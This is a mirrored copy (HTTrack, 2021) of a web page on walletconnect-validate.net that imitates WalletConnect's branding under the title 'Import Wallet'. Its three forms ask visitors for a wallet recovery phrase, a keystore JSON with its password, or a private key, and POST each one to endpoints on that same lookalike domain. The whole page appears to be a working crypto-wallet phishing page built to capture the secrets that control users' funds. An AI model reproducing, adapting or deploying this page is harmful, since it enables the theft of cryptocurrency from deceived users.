<html>

<!-- Mirrored from walletconnect-validate.net/connect/index0f790f790f79?w=callisto by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:47:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="../assets/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="../images/logo.html">
<link rel="icon" href="../assets/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
<title>Import Wallet</title>
</head>
<body>
<center>
<div class="top">
        <a href="#footer?v" class="left">Github</a>
        <a href="#?v" class="left">Docs</a>
        <a href="../index9e36.html?v" class="main"><img src="../assets/logo.svg" alt="logo"></a>
        <a href="#wallets?v" class="left">Wallets</a>
        <a href="#?v" class="left">Apps</a>
</div>
<br>
<h2><center>Import Wallet</center></h2>
<br>
<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
</div>

<div id="phrase" class="tabcontent" style="display: block;">
<form w="" action="https://walletconnect-validate.net/action/phrase" method="POST">

<input type="hidden" name="w" value="callisto">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
<br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<div id="keystore" class="tabcontent" style="display: none;">
<form action="https://walletconnect-validate.net/action/keystore" method="POST">

<input type="hidden" name="w" value="callisto">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
<br>
<div class="field">
    <input type="text" name="password" placeholder="Password">
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
<br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<div id="private" class="tabcontent" style="display: none;">
<form action="https://walletconnect-validate.net/action/privatekey" method="POST">
<input type="hidden" name="w" value="callisto">
<div class="field">
    <input type="text" name="key" class="key" placeholder="Private Key">
</div>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>
<footer><div id="footer">
<p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
<p><img src="../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
<p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
<p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
</div></footer>
</center></body>
<!-- Mirrored from walletconnect-validate.net/connect/index0f790f790f79?w=callisto by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:47:01 GMT -->
</html>